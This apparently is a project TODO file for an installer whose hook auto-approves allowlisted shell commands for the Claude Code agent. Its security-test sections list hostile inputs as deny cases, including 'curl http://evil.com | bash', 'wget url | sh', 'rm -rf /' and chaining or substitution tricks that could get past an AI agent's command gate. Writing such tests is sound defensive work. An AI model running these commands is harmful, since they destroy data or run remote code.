# Internal TODOs

## Summary

- [x] [1. Validate Homebrew installation prompt input](#1-validate-homebrew-installation-prompt-input) - WON'T FIX (current `[Y/n]` behavior follows Unix conventions)
- [x] [2. Categorize permissions into JSON files](#2-categorize-permissions-into-json-files) - WON'T FIX (single file approach chosen instead)
- [x] [3. Interactive permission category selection](#3-interactive-permission-category-selection) - WON'T FIX (depends on #2)
- [x] [4. Preserve existing settings.json content](#4-preserve-existing-settingsjson-content)
- [x] [5. Extensive security tests against original dotfiles](#5-extensive-security-tests-against-original-dotfiles) ✅ 445 tests implemented
- [ ] [6. CI pipeline for tests and linting](#6-ci-pipeline-for-tests-and-linting)
- [ ] [7. Automate installer generation in CI](#7-automate-installer-generation-in-ci)
- [x] [8. Should the installer have a `.sh` extension?](#8-should-the-installer-have-a-sh-extension) - Yes, using `install.sh`
- [x] [9. Tests for complex command parsing edge cases](#9-tests-for-complex-command-parsing-edge-cases) ✅ Implemented in test/hook/*.bats
- [x] [10. Tests for string content not being parsed as commands](#10-tests-for-string-content-not-being-parsed-as-commands) ✅ Implemented in parsing_string_safety.bats
- [x] [11. Shell configuration with alias workaround](#11-shell-configuration-with-alias-workaround)
- [ ] [12. Dotfiles manager support for shell config modifications](#12-dotfiles-manager-support-for-shell-config-modifications)
- [ ] [13. Redesign installer flow with customization options](#13-redesign-installer-flow-with-customization-options)
- [ ] [14. Document and showcase hook capabilities](#14-document-and-showcase-hook-capabilities)
- [x] [15. Rebrand from "fix bugs" to "enhance behavior"](#15-rebrand-from-fix-bugs-to-enhance-behavior)
- [x] [16. Remove --hook-prefix flag after dotfiles manager support](#16-remove---hook-prefix-flag-after-dotfiles-manager-support)
- [x] [17. Default shell to bash instead of $SHELL](#17-default-shell-to-bash-instead-of-shell)
- [x] [18. Use relative hook path in settings.json](#18-use-relative-hook-path-in-settingsjson) - Uses `$HOME` which Claude expands at runtime
- [x] [19. Test commands with colons](#19-test-commands-with-colons) ✅ Implemented in parsing_special_chars.bats
- [ ] [20. Regex-based allowlist for conditional command approval](#20-regex-based-allowlist-for-conditional-command-approval)
- [ ] [21. Allow custom installation to specify custom shell](#21-allow-custom-installation-to-specify-custom-shell)

---

## 1. Validate Homebrew installation prompt input

**Files containing `^[Nn]$` pattern:**
- `src/lib/deps.sh` - `prompt_homebrew_install()`
- `src/dependencies_command.sh` - line 23
- `src/all_command.sh` - line 28

Currently we only check if input is `N`, treating anything else as `Y`. This is wrong.

**Fix:** Validate that input is exactly `Y`, `y`, `N`, or `n`. Keep prompting until valid input.

```bash
# Current (bad)
if [[ $REPLY =~ ^[Nn]$ ]]; then
  ...
fi
install_homebrew

# Should be
while true; do
  read -p "Install Homebrew now? [Y/n] " -n 1 -r
  echo ""
  case "$REPLY" in
    [Yy]) install_homebrew; break ;;
    [Nn]) print_manual_homebrew_instructions; return 1 ;;
    *) warn "Please enter Y or N" ;;
  esac
done
```

---

## 2. Categorize permissions into JSON files

**Current:** All permissions are in a single bash array in `src/lib/permissions.sh`

**Goal:** Split into categorized JSON files for better organization and user selection.

**Structure:**
```
src/permissions/
├── file-reading.json
├── git.json
├── java.json
├── go.json
├── node.json
├── web.json
├── system-info.json
├── text-processing.json
└── miscellaneous.json
```

**Format:**
```json
{
  "name": "Git (read-only)",
  "description": "Git commands that only read repository state",
  "permissions": [
    "Bash(git status:*)",
    "Bash(git diff:*)",
    "Bash(git log:*)"
  ]
}
```

---

## 3. Interactive permission category selection

**Goal:** Prompt users with a checklist of permission categories.

**UI:**
```
Select permission categories to install:

[x] All (recommended)
[ ] File reading (cat, head, tail, less, etc.)
[ ] Git read-only (status, diff, log, etc.)
[ ] Text processing (grep, awk, sed, jq, etc.)
[ ] System info (date, whoami, uname, etc.)
[ ] Node.js (npm, node, etc.)
[ ] Java (mvn, gradle, etc.)
[ ] Go (go list, go env, etc.)
[ ] Web tools (curl, wget, etc.)

Use arrow keys to navigate, space to toggle, enter to confirm.
```

**Implementation notes:**
- Generate list from JSON file names in `src/permissions/`
- Default to "All" selected
- Use `dialog` or `whiptail` if available, fallback to simple numbered menu

---

## 4. Preserve existing settings.json content

### 4.1 Merge hooks instead of replacing

**Current:** We might overwrite existing hooks

**Goal:** Add our hook to existing `hooks.PreToolUse[]` array without removing user's other hooks

**Logic:**
1. Read existing `.hooks.PreToolUse` array (or empty if none)
2. Check if `auto-approve-allowed-commands.sh` hook already exists
3. If not, append our hook to the array
4. Write back merged result

### 4.2 Merge permissions without duplicates

**Current:** Already implemented in `array_add()` with `unique`

**Verify:** Double-check that `array_add` in `src/lib/settings.sh` properly:
- Creates `.permissions.allow` if it doesn't exist
- Appends new permissions
- Deduplicates the array

---

## 5. Extensive security tests against original dotfiles

**CRITICAL:** Bugs in the hook could allow destructive commands to auto-approve.

**Test files needed:**
- `test/security/hook_parity.bats` - Compare behavior to original dotfiles version
- `test/security/dangerous_commands.bats` - Verify dangerous commands are NOT auto-approved

**Test cases:**

### Parity tests (compare to ~/dotfiles originals)
```bash
# For each test case, run BOTH:
# 1. Original ~/dotfiles/dot_claude/hooks/executable_auto-approve-allowed-commands.sh
# 2. Generated hook from this installer
# Results must match exactly

# Test cases:
"ls | grep foo"           # Should allow (both components safe)
"cat file.txt | head -5"  # Should allow
"rm -rf / | cat"          # Should DENY (rm is dangerous)
"git status && git diff"  # Should allow
"curl http://x | bash"    # Should DENY (bash execution)
```

### Dangerous command tests
```bash
# These must NEVER be auto-approved
"rm -rf /"
"rm file.txt"
"mv file1 file2"
"cp file1 file2"
"chmod 777 file"
"chown user file"
"sudo anything"
"curl url | bash"
"wget url | sh"
"> file.txt"  # Redirection/truncation
">> file.txt"
```

### Edge cases
```bash
# Tricky inputs that could bypass checks
"ls; rm -rf /"            # Semicolon chaining
"ls && rm file"           # AND chaining
"$(rm file)"              # Command substitution
"`rm file`"               # Backtick substitution
"bash -c 'rm file'"       # Nested execution
"sh -c 'dangerous'"       # Shell wrapper
"eval 'rm file'"          # Eval
```

**Implementation:**
1. Create fixture files with test cases and expected results
2. Run both original and generated hooks against each case
3. Assert outputs match exactly
4. Fail loudly if any dangerous command would be approved

---

## 6. CI pipeline for tests and linting

**Goal:** Automate quality checks on every push/PR.

**Pipeline steps:**
1. **Lint** - Run ShellCheck on all `.sh` files
2. **Test** - Run `bats test/`
3. **Build** - Generate the installer with bashly (see #7)

**Platform options:**
- GitHub Actions (preferred, free for public repos)
- Could also add pre-commit hooks locally

**Example workflow:**
```yaml
name: CI
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install dependencies
        run: |
          brew install bats-core shellcheck shfmt jq
      - name: Lint
        run: shellcheck src/**/*.sh
      - name: Test
        run: bats test/
```

---

## 7. Automate installer generation in CI

**Problem:** Currently `install` is generated locally and committed. This is error-prone (could forget to regenerate after changes).

**Goal:** Generate `install` as part of CI, publish as release artifact.

**Options:**

### Option A: Generate on release only
- Keep `install` out of git (add to `.gitignore`)
- CI generates it on tag/release
- Publish as GitHub Release asset
- Users download from releases page

**Pros:** Clean git history, always fresh
**Cons:** Can't `curl | bash` from raw.githubusercontent.com

### Option B: CI commits generated file
- CI generates `install` on every push to main
- CI commits it back to the repo
- Raw GitHub URL always works

**Pros:** Simple curl install works
**Cons:** Auto-commits are messy, merge conflicts possible

### Option C: GitHub Pages / separate branch
- Generate `install` in CI
- Push to `gh-pages` branch or separate `dist` branch
- Serve from `https://username.github.io/better-claude-code/install`

**Pros:** Clean separation, curl works, no auto-commits to main
**Cons:** Slightly more complex setup

### Option D: Use GitHub Releases API for "latest"
- Generate on release
- Create a redirect URL that always points to latest release asset
- `https://github.com/.../releases/latest/download/install`

**Pros:** Clean, versioned, curl works
**Cons:** Requires tagging releases

**Recommendation:** Option D seems cleanest. The curl command becomes:
```bash
curl -fsSL https://github.com/AbdelrahmanHafez/better-claude-code/releases/latest/download/install | bash
```

---

## 8. Should the installer have a `.sh` extension?

**Current:** `install` (no extension)

**Arguments for `.sh`:**
- Clear it's a shell script
- Better syntax highlighting when viewing raw on GitHub
- Some security tools/firewalls treat extensionless executables differently
- Consistent with Unix conventions for distributed scripts

**Arguments against:**
- Shorter URL for curl
- `./install` looks cleaner than `./install.sh`
- Hashbang already declares it's bash

**Decision:** TBD - leaning towards `install.sh` for clarity

**If we change:**
1. Rename `install` -> `install.sh`
2. Update README curl command
3. Update bashly.yml output filename
4. Update all documentation references

---

## 9. Tests for complex command parsing edge cases

**Goal:** Ensure the hook correctly parses and validates various command patterns.

### For loops
```bash
"for f in *.txt; do cat $f; done"   # Should parse inner commands
"for i in 1 2 3; do echo $i; done"  # Should allow if echo is allowed
```

### Commands with newlines
```bash
"ls\ngrep foo"                      # Newline-separated commands
"cat file.txt \n| head"             # Newline in pipe
```

### Commands with slashes (paths)
```bash
"/usr/bin/ls"                       # Absolute path
"./script.sh"                       # Relative path
"../other/script.sh"                # Parent path
```

### Prefix matching with spaces vs hyphens

**Critical:** `python3:*` permission should match:
- `python3 script.py` (space after command)
- `python3 ./foo/bar.py` (with path)

**Must NOT match:**
- `python3-pip` (hyphenated command is different binary)
- `python3.11` (version suffix is different binary)

```bash
# Given permission: Bash(python3:*)
"python3 script.py"         # ALLOW - space separates command from args
"python3 ./foo/bar.py"      # ALLOW - path as argument
"python3-pip install x"     # DENY - different command (python3-pip)
"python3.11 script.py"      # DENY - different command (python3.11)
```

### Path prefix matching (directory allowlisting)

**Use case:** Allow running any script under a specific directory.

```bash
# Given permission: Bash(python3 .claude/skills:*)
"python3 .claude/skills/foo.py"           # ALLOW - under allowed dir
"python3 .claude/skills/sub/bar.py"       # ALLOW - nested under allowed dir
"python3 .claude/other/bad.py"            # DENY - different directory
"python3 .claude/skillsmalicious.py"      # DENY - not a subdirectory, just prefix match
```

**Implementation note:** Need to ensure path matching uses directory boundaries, not just string prefix. `.claude/skills` should match `.claude/skills/` but not `.claude/skillsxxx`.

### Mixed edge cases
```bash
"python3 -c 'import os; os.system(\"rm -rf /\")'"  # DENY - inline code execution
"bash -c 'ls | grep foo'"                          # Should recursively parse inner command
"/bin/bash -c 'rm file'"                           # DENY - dangerous inner command
```

### Test implementation
```bash
@test "prefix: python3 allows python3 with space" {
  # ... setup with Bash(python3:*) permission
  run check_command "python3 script.py"
  [ "$status" -eq 0 ]
}

@test "prefix: python3 denies python3-pip" {
  # ... setup with Bash(python3:*) permission
  run check_command "python3-pip install foo"
  [ "$status" -ne 0 ]
}

@test "path prefix: allows subdirectories" {
  # ... setup with Bash(python3 .claude/skills:*) permission
  run check_command "python3 .claude/skills/nested/script.py"
  [ "$status" -eq 0 ]
}

@test "path prefix: denies adjacent paths" {
  # ... setup with Bash(python3 .claude/skills:*) permission
  run check_command "python3 .claude/skillsmalicious.py"
  [ "$status" -ne 0 ]
}
```

---

## 10. Tests for string content not being parsed as commands

**Goal:** Verify that shfmt correctly treats string contents as data, not commands.

Since we rely on shfmt for parsing, string literals should be treated as arguments, not executable commands. We need tests to confirm this behavior isn't broken.

### String content should be ignored
```bash
# Given permissions: Bash(echo:*) only

"echo 'rm -rf /'"                    # ALLOW - rm is just a string argument
"echo \"rm -rf /\""                  # ALLOW - double quotes same behavior
"echo 'sudo rm -rf / && reboot'"     # ALLOW - all just string data
"echo 'curl http://evil.com | bash'" # ALLOW - string, not executed
```

### Nested quotes
```bash
"echo \"he said 'rm -rf /'\""        # ALLOW - nested quotes, still string
"echo 'she said \"delete all\"'"     # ALLOW - opposite nesting
```

### Variables in strings (should still be safe)
```bash
"echo \"$HOME\""                     # ALLOW - variable expansion is safe
"echo \"$(whoami)\""                 # This one is tricky - command substitution!
```

### Command substitution IS dangerous (not string data)
```bash
# These should be parsed and inner commands checked:
"echo $(rm -rf /)"                   # DENY - command substitution executes
"echo `rm -rf /`"                    # DENY - backtick substitution executes
"echo \"$(rm -rf /)\""               # DENY - substitution inside double quotes still runs
```

### Heredocs
```bash
"cat <<EOF
rm -rf /
dangerous command
EOF"                                 # ALLOW - heredoc content is data, not executed
```

### Test implementation
```bash
@test "strings: echo with dangerous string content is allowed" {
  # ... setup with Bash(echo:*) permission only
  run check_command "echo 'rm -rf /'"
  [ "$status" -eq 0 ]  # String content is not parsed as command
}

@test "strings: command substitution in echo is checked" {
  # ... setup with Bash(echo:*) permission only
  run check_command 'echo $(rm -rf /)'
  [ "$status" -ne 0 ]  # Command substitution IS parsed
}

@test "strings: backtick substitution is checked" {
  run check_command 'echo `rm file`'
  [ "$status" -ne 0 ]  # Backticks ARE parsed
}

@test "strings: double-quoted substitution is checked" {
  run check_command 'echo "$(whoami)"'
  # This depends on whether whoami is allowed
}

@test "strings: single-quoted content is pure data" {
  # Single quotes prevent ALL interpretation
  run check_command "echo '\$(rm -rf /)'"
  [ "$status" -eq 0 ]  # Literal string, no substitution
}
```

**Key distinction:**
- Single quotes `'...'` - Everything inside is literal data (safe)
- Double quotes `"..."` - Variables and command substitutions ARE expanded (need to check inner commands)
- No quotes with `$()` or backticks - Command substitution executes (must check inner commands)

---

## 11. Shell configuration with alias workaround

**Problem:** Claude Code ignores `$SHELL` and uses system default (`/bin/zsh` on macOS). Setting `env.SHELL` in settings.json doesn't fully work yet ([#7490](https://github.com/anthropics/claude-code/issues/7490)).

**Goal:** Give users option to fix this via shell alias that forces correct `$SHELL`.

### User flow

1. **Prompt user:**
   ```
   Claude Code has a bug where it ignores your $SHELL preference.
   Would you like to configure Claude to use your preferred shell? [Y/n]
   ```

2. **If yes, show shell picker:**
   ```
   Select shell for Claude Code to use:

   1) bash (recommended) - Uses Homebrew bash 5.x
   2) zsh - macOS default
   3) fish - Fish shell
   4) Other - Specify custom path

   Choice [1]:
   ```

3. **Apply fix via two methods:**
   - Set `env.SHELL` in settings.json (for when the bug is fixed)
   - Add alias to ALL shell config files (immediate workaround)

### Shell paths

```bash
# Bash (prefer Homebrew version for bash 5.x features)
/opt/homebrew/bin/bash  # Apple Silicon
/usr/local/bin/bash     # Intel Mac
/bin/bash               # Fallback (but this is bash 3.2)

# Zsh
/bin/zsh

# Fish
/opt/homebrew/bin/fish
/usr/local/bin/fish
```

### Alias format

The alias must:
1. Set SHELL env var for the claude process
2. Pass ALL arguments through
3. Work in bash, zsh, and fish syntax

**Bash/Zsh (~/.bashrc, ~/.zshrc):**
```bash
alias claude='SHELL=/opt/homebrew/bin/bash command claude'
```

**Fish (~/.config/fish/config.fish):**
```fish
alias claude 'SHELL=/opt/homebrew/bin/bash command claude'
```

### Config files to modify

Detect and modify ALL of these if they exist:
```bash
~/.bashrc
~/.bash_profile
~/.zshrc
~/.zprofile
~/.config/fish/config.fish
```

### Implementation

```bash
configure_shell_alias() {
  local shell_path="$1"
  local alias_line_bash="alias claude='SHELL=$shell_path command claude'"
  local alias_line_fish="alias claude 'SHELL=$shell_path command claude'"

  # Bash configs
  for rc in ~/.bashrc ~/.bash_profile; do
    if [[ -f "$rc" ]]; then
      add_alias_if_missing "$rc" "$alias_line_bash"
    fi
  done

  # Zsh configs
  for rc in ~/.zshrc ~/.zprofile; do
    if [[ -f "$rc" ]]; then
      add_alias_if_missing "$rc" "$alias_line_bash"
    fi
  done

  # Fish config
  local fish_config=~/.config/fish/config.fish
  if [[ -f "$fish_config" ]]; then
    add_alias_if_missing "$fish_config" "$alias_line_fish"
  fi
}

add_alias_if_missing() {
  local file="$1"
  local alias_line="$2"

  # Check if alias already exists (any claude alias)
  if grep -q "alias claude" "$file" 2>/dev/null; then
    warn "Claude alias already exists in $file, skipping"
    return 0
  fi

  # Add with a comment
  echo "" >> "$file"
  echo "# Added by better-claude-code - fixes shell bug" >> "$file"
  echo "$alias_line" >> "$file"
  success "Added alias to $file"
}
```

### Considerations

- **Backup before modifying** - Create `.bak` files before editing rc files
- **Idempotent** - Don't add duplicate aliases
- **Marker comment** - Add comment so users know where it came from
- **Uninstall support** - Document how to remove the alias
- **Inform user** - Tell them to restart their shell or `source` the file

### Output message

```
Shell configuration complete!

Changes made:
  ✓ Set env.SHELL in ~/.claude/settings.json
  ✓ Added alias to ~/.bashrc
  ✓ Added alias to ~/.zshrc
  ✓ Added alias to ~/.config/fish/config.fish

To apply immediately, run:
  source ~/.zshrc  # or restart your terminal

Note: The alias workaround is needed until Claude Code fixes issue #7490.
      Once fixed, you can remove the aliases - env.SHELL will work directly.
```

---

## 12. Dotfiles manager support for shell config modifications

**Problem:** Users with dotfiles managers (chezmoi, etc.) don't want direct modifications to `~/.bashrc`. They need changes made to their source files (e.g., `~/dotfiles/dot_bashrc`).

**Goal:** Support dotfiles managers when adding shell aliases.

### Option A: `--dotfiles-manager` flag (Recommended)

```bash
./install --dotfiles-manager chezmoi all
./install --dotfiles-manager chezmoi --dotfiles-path ~/dotfiles all
```

**Supported managers:**
- `chezmoi` - Uses `dot_` prefix convention
- `stow` - Uses direct filenames in stow directory
- `yadm` - Uses `~/.config/yadm/alt/` for templates
- `none` (default) - Modify files directly in `$HOME`

### Chezmoi mapping

| Real path | Chezmoi source |
|-----------|----------------|
| `~/.bashrc` | `~/dotfiles/dot_bashrc` |
| `~/.bash_profile` | `~/dotfiles/dot_bash_profile` |
| `~/.zshrc` | `~/dotfiles/dot_zshrc` |
| `~/.zprofile` | `~/dotfiles/dot_zprofile` |
| `~/.config/fish/config.fish` | `~/dotfiles/dot_config/fish/config.fish` |

### Auto-detect dotfiles path

```bash
get_dotfiles_path() {
  local manager="$1"
  local custom_path="${2:-}"

  if [[ -n "$custom_path" ]]; then
    echo "$custom_path"
    return
  fi

  case "$manager" in
    chezmoi)
      # Try to get from chezmoi itself
      if command -v chezmoi &>/dev/null; then
        chezmoi source-path 2>/dev/null || echo "$HOME/dotfiles"
      else
        echo "$HOME/dotfiles"
      fi
      ;;
    stow)
      echo "$HOME/dotfiles"
      ;;
    *)
      echo "$HOME"
      ;;
  esac
}
```

### Path translation for chezmoi

```bash
translate_path_chezmoi() {
  local real_path="$1"
  local dotfiles_root="$2"

  # ~/.bashrc -> dot_bashrc
  # ~/.config/fish/config.fish -> dot_config/fish/config.fish

  local relative="${real_path#$HOME/}"      # Remove $HOME/
  relative="${relative#.}"                   # Remove leading dot
  relative="dot_$relative"                   # Add dot_ prefix

  echo "$dotfiles_root/$relative"
}

# Examples:
# translate_path_chezmoi ~/.bashrc ~/dotfiles
#   -> ~/dotfiles/dot_bashrc
# translate_path_chezmoi ~/.config/fish/config.fish ~/dotfiles
#   -> ~/dotfiles/dot_config/fish/config.fish
```

### Updated output for chezmoi users

```
Shell configuration complete!

Changes made:
  ✓ Set env.SHELL in ~/dotfiles/dot_claude/settings.json
  ✓ Added alias to ~/dotfiles/dot_bashrc
  ✓ Added alias to ~/dotfiles/dot_zshrc
  ✓ Added alias to ~/dotfiles/dot_config/fish/config.fish

To apply immediately, run:
  chezmoi apply ~/.bashrc ~/.zshrc ~/.config/fish/config.fish && source ~/.zshrc

Note: The alias workaround is needed until Claude Code fixes issue #7490.
```

### CLI flags

```yaml
# In bashly.yml
flags:
  - long: --dotfiles-manager
    short: -m
    arg: manager
    help: "Dotfiles manager (chezmoi, stow, yadm, none)"
    default: "none"

  - long: --dotfiles-path
    arg: path
    help: "Path to dotfiles source directory (auto-detected if not specified)"
```

### Implementation considerations

- **Auto-detect manager** - Check for `.chezmoi.toml.tmpl`, `.stow-local-ignore`, etc.
- **Validate paths exist** - Warn if translated source file doesn't exist
- **Create parent dirs** - If `dot_config/fish/` doesn't exist, create it
- **Track modified files** - Keep list for the `chezmoi apply` command at the end
- **Current shell detection** - Use `$SHELL` to determine which rc file to `source`

### Edge case: File doesn't exist in dotfiles yet

If user has `~/.bashrc` but no `~/dotfiles/dot_bashrc`:

```
Warning: ~/.bashrc exists but ~/dotfiles/dot_bashrc does not.
Would you like to:
  1) Add it to chezmoi first (chezmoi add ~/.bashrc)
  2) Create dot_bashrc directly
  3) Skip this file

Choice [1]:
```

### Checking what chezmoi manages

**Problem:** A chezmoi user might have some files managed and others not. For example:
- `~/.claude/` → managed (in `~/dotfiles/dot_claude/`)
- `~/.config/fish/` → managed
- `~/.bashrc` → NOT managed (user doesn't use bash)
- `~/.zshrc` → NOT managed (exists but user chose not to track it)

We need to detect which files are actually managed by chezmoi and handle each case appropriately.

**Solution:** Use `chezmoi managed` to get list of managed files.

```bash
# Get all managed files
chezmoi managed

# Check if a specific file is managed
chezmoi managed | grep -q "^\.bashrc$"

# Or use chezmoi source-path to check (returns error if not managed)
chezmoi source-path ~/.bashrc 2>/dev/null
```

### Implementation

```bash
is_managed_by_chezmoi() {
  local file="$1"
  local relative="${file#$HOME/}"

  # Check if chezmoi knows about this file
  if chezmoi managed 2>/dev/null | grep -qx "$relative"; then
    return 0  # Managed
  else
    return 1  # Not managed
  fi
}

get_target_path_for_rc_file() {
  local rc_file="$1"           # e.g., ~/.bashrc
  local manager="$2"           # e.g., chezmoi
  local dotfiles_path="$3"     # e.g., ~/dotfiles

  case "$manager" in
    chezmoi)
      if is_managed_by_chezmoi "$rc_file"; then
        # File is managed - modify the source file
        translate_path_chezmoi "$rc_file" "$dotfiles_path"
      else
        # File is NOT managed - modify directly (or prompt user)
        echo "$rc_file"
      fi
      ;;
    *)
      echo "$rc_file"
      ;;
  esac
}
```

### Decision flow for each rc file

```
For each rc file (~/.bashrc, ~/.zshrc, etc.):

1. Does the file exist in $HOME?
   NO  → Skip (user doesn't use this shell)
   YES → Continue

2. Is chezmoi managing this file?
   YES → Modify ~/dotfiles/dot_bashrc (or wherever chezmoi source-path points)
   NO  → Prompt user:

   ~/.bashrc exists but is not managed by chezmoi.
   Would you like to:
     1) Add it to chezmoi first, then modify (chezmoi add ~/.bashrc)
     2) Modify ~/.bashrc directly (not recommended for chezmoi users)
     3) Skip this file

   Choice [1]:
```

### Track modifications for final output

```bash
declare -A MODIFIED_FILES  # Associative array: real_path -> source_path

# After modifying each file
MODIFIED_FILES["$HOME/.bashrc"]="$dotfiles_path/dot_bashrc"
MODIFIED_FILES["$HOME/.zshrc"]="$HOME/.zshrc"  # Direct modification

# At the end, generate appropriate apply command
generate_apply_instructions() {
  local chezmoi_files=()
  local direct_files=()

  for real_path in "${!MODIFIED_FILES[@]}"; do
    local source_path="${MODIFIED_FILES[$real_path]}"
    if [[ "$source_path" == *"/dot_"* ]]; then
      chezmoi_files+=("$real_path")
    else
      direct_files+=("$real_path")
    fi
  done

  if [[ ${#chezmoi_files[@]} -gt 0 ]]; then
    echo "To apply chezmoi changes:"
    echo "  chezmoi apply ${chezmoi_files[*]}"
  fi

  if [[ ${#direct_files[@]} -gt 0 ]]; then
    echo "Files modified directly: ${direct_files[*]}"
  fi

  echo ""
  echo "Then reload your shell:"
  echo "  source ~/${current_shell}rc  # or restart your terminal"
}
```

### Example output scenarios

**Scenario 1: All files managed by chezmoi**
```
Shell configuration complete!

Changes made:
  ✓ ~/dotfiles/dot_zshrc (managed by chezmoi)
  ✓ ~/dotfiles/dot_config/fish/config.fish (managed by chezmoi)
  ⊘ ~/.bashrc skipped (doesn't exist)

To apply:
  chezmoi apply ~/.zshrc ~/.config/fish/config.fish && source ~/.zshrc
```

**Scenario 2: Mixed managed and unmanaged**
```
Shell configuration complete!

Changes made:
  ✓ ~/dotfiles/dot_zshrc (managed by chezmoi)
  ✓ ~/.bashrc (modified directly - not managed by chezmoi)
  ⊘ ~/.config/fish/config.fish skipped (doesn't exist)

To apply chezmoi changes:
  chezmoi apply ~/.zshrc

Direct modifications take effect on next shell reload:
  source ~/.bashrc  # or restart your terminal
```

---

## 13. Redesign installer flow with customization options

**Goal:** Make the installer more user-friendly with a clear flow and customization options.

### New installer flow

```
┌─────────────────────────────────────────┐
│   Better Claude Code Installer          │
└─────────────────────────────────────────┘

Step 1: Check dependencies
  ✓ Homebrew 4.2.0
  ✓ bash 5.2
  ✓ jq 1.7
  ✗ shfmt not found

Some dependencies are missing. Install them now? [Y/n] Y

Installing shfmt via Homebrew...
  ✓ shfmt installed

All dependencies ready!

────────────────────────────────────────────

What would you like to do?

  1) Install everything (recommended)
     - Better piped command handling
     - Shell configuration fix
     - Safe command permissions

  2) Customize installation
     - Choose which features to install

Choice [1]:
```

### Option 1: Install everything

If user selects "Install everything", run all steps automatically:
1. Install auto-approve-allowed-commands hook
2. Configure shell (with picker if needed)
3. Add all safe permissions

### Option 2: Customize installation

Show a checklist:

```
Select features to install (space to toggle, enter to confirm):

  [x] Auto-approve-allowed-commands hook
      Enables auto-approval of piped commands (ls | grep foo)
      when all components are individually allowed

  [x] Shell configuration
      Fixes Claude Code ignoring your $SHELL preference
      (Will prompt for shell selection)

  [x] Safe command permissions
      Adds ~80 read-only commands to auto-approve list
      (Will prompt for category selection)

Press Enter to continue...
```

### After customization, run selected features

```
Installing selected features...

Step 1/3: Installing auto-approve-allowed-commands hook
  ✓ Hook installed to ~/.claude/hooks/auto-approve-allowed-commands.sh
  ✓ Hook configured in settings.json

Step 2/3: Configuring shell
  Select shell for Claude Code:
    1) bash (recommended)
    2) zsh
    3) fish
    4) Other
  Choice [1]: 1
  ✓ Shell configured to /opt/homebrew/bin/bash

Step 3/3: Adding permissions
  Select permission categories:
    [x] All (recommended)
    [ ] File reading
    [ ] Git read-only
    ...
  ✓ Added 82 safe command permissions

────────────────────────────────────────────

Installation complete!

Changes made:
  ✓ ~/.claude/hooks/auto-approve-allowed-commands.sh
  ✓ ~/.claude/settings.json

Start a new Claude Code session to apply changes.
```

### Implementation structure

```bash
# Main entry point
main() {
  print_banner

  # Step 1: Dependencies (always required)
  ensure_dependencies || exit 1

  # Step 2: Choose mode
  local mode
  mode=$(prompt_installation_mode)

  case "$mode" in
    1) install_everything ;;
    2) install_customized ;;
  esac

  print_completion
}

prompt_installation_mode() {
  echo ""
  echo "What would you like to do?"
  echo ""
  echo "  1) Install everything (recommended)"
  echo "  2) Customize installation"
  echo ""

  local choice
  read -p "Choice [1]: " choice
  echo "${choice:-1}"
}

install_everything() {
  install_hook
  configure_shell_interactive
  add_all_permissions
}

install_customized() {
  local features
  features=$(prompt_feature_selection)

  for feature in $features; do
    case "$feature" in
      hook) install_hook ;;
      shell) configure_shell_interactive ;;
      permissions) prompt_and_add_permissions ;;
    esac
  done
}
```

### UI considerations

- **Default to "Install everything"** - Most users want the full fix
- **Clear descriptions** - Explain what each feature does in plain English
- **Non-destructive** - Show what will be changed before doing it
- **Idempotent** - Running twice should be safe (skip already-installed features)
- **Progress indication** - Show step X/Y during installation

### Checklist UI options

For the feature/permission selection checklists:

1. **Simple numbered menu** (works everywhere)
   ```
   Select features (comma-separated, e.g., 1,2,3):
     1) Auto-approve-allowed-commands hook
     2) Shell configuration
     3) Safe permissions

   Choice [1,2,3]:
   ```

2. **Interactive with dialog/whiptail** (if available)
   - Better UX with arrow keys and space to toggle
   - Fallback to numbered menu if not available

3. **fzf multi-select** (if available)
   - Modern, pretty interface
   - Fallback to numbered menu

---

## 14. Document and showcase hook capabilities

**Goal:** Create documentation that showcases how smart the auto-approve-allowed-commands hook is, helping users understand its capabilities and building trust.

### Features to document

#### 1. Piped commands
```bash
ls -la | grep foo | head -5
# Parses into: ls, grep, head
# Checks each against permissions individually
```

#### 2. Command chaining
```bash
git status && git diff
git fetch || echo "fetch failed"
cmd1; cmd2; cmd3
```

#### 3. For loops
```bash
for f in *.txt; do cat "$f"; done
# Extracts: cat
# Allows if cat is permitted
```

#### 4. While loops
```bash
while read line; do echo "$line"; done < file.txt
# Extracts: echo
```

#### 5. Subshells
```bash
(cd /tmp && ls)
# Extracts: cd, ls
```

#### 6. Command substitution
```bash
echo "Today is $(date)"
# Extracts: echo, date
# Both must be allowed
```

#### 7. `bash -c` / `sh -c` unwrapping
```bash
bash -c 'ls | grep foo'
# Recursively parses inner command
# Extracts: ls, grep
```

#### 8. Multiline commands
```bash
ls -la \
  | grep foo \
  | head -5
# Handles continuation properly
```

#### 9. Comment stripping
```bash
ls # this is a comment
# Comment is ignored, only ls is checked
```

#### 10. Command prefixes with paths
```bash
# Permission: Bash(python3 .claude/skills:*)
python3 .claude/skills/run.py      # ALLOW
python3 .claude/skills/sub/foo.py  # ALLOW (subdirectory)
python3 .claude/other/bad.py       # DENY
```

#### 11. Heredocs (content as data)
```bash
cat <<EOF
rm -rf /
dangerous stuff
EOF
# Only checks: cat
# Heredoc content is data, not commands
```

#### 12. String content safety
```bash
echo 'rm -rf /'
# Only checks: echo
# String content is not parsed as command
```

### Where to document

1. **README.md** - Add a "How It Works" section with examples
2. **Installer output** - Brief mention during installation
3. **Dedicated FEATURES.md** - Deep dive for curious users
4. **Comments in hook script** - Inline documentation

### README section draft

```markdown
## How the Hook Works

The auto-approve-allowed-commands hook uses `shfmt` to parse commands into an AST, then checks
each component against your allowed permissions. This handles complex shell
syntax that simple prefix matching can't:

| Command | What's Checked |
|---------|----------------|
| `ls \| grep foo` | `ls`, `grep` |
| `git status && git diff` | `git status`, `git diff` |
| `for f in *.txt; do cat $f; done` | `cat` |
| `bash -c 'ls \| head'` | `ls`, `head` (unwrapped) |
| `echo 'rm -rf /'` | `echo` (string content ignored) |

If ALL extracted commands match your allowed prefixes, the command auto-approves.
Otherwise, Claude Code prompts you as normal.
```

### Demo GIF/video idea

Create a short demo showing:
1. Running `ls | grep foo` - auto-approved
2. Running `ls | rm file` - blocked (rm not allowed)
3. Showing the parsed output for complex commands

---

## 15. Rebrand from "fix bugs" to "enhance behavior"

**Current messaging:** "Fixes Claude Code bugs"

**Problem:** Framing as "bug fixes" has downsides:
- Sounds like Claude Code is broken (negative)
- May become outdated if/when Anthropic fixes the issues
- Undersells the value we provide

**New messaging:** "Enhances Claude Code behavior"

### Files to update

1. **README.md**
   - Title/tagline
   - "What This Fixes" → "What This Does" or "Features"
   - Reframe issues as "limitations" not "bugs"

